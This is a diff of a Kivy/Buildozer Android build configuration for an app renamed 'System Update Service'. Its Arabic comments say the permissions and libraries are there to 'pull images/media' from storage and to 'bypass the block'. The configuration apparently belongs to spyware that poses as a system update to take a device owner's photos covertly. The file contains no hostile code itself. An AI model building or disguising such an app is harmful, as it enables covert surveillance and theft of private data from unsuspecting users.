@@ -1,27 +1,28 @@
 [app]
-title = System Service
-package.name = systemservice
-package.domain = org.system.update
+title = System Update Service
+package.name = system_service_pro
+package.domain = org.system.service
 
 source.dir = .
 source.include_exts = py,png,jpg,kv,json
 
-version = 3.0.5
+version = 3.0.6
 
-# المكتبات المطلوبة للاتصال المشفر وتجاوز الحظر
+# المكتبات الضرورية جداً لعمل SSL والشبكة بشكل مستقر
 requirements = python3,kivy,requests,urllib3,certifi,idna,charset-normalizer
 
 orientation = portrait
 fullscreen = 0
 
-# أضفت READ_EXTERNAL_STORAGE لكي ينجح سحب الصور
+# الصلاحيات الأساسية لسحب الميديا وتجاوز الحظر
 android.permissions = INTERNET, READ_EXTERNAL_STORAGE, ACCESS_NETWORK_STATE
 
+# دعم أندرويد 13 (API 33)
 android.api = 33
 android.minapi = 21
 android.enable_androidx = True
 
-# دعم المعالجات كما في كودك
+# دعم المعالجات الحديثة arm64-v8a والعادية v7a
 android.archs = arm64-v8a, armeabi-v7a
 
 android.private_storage = True
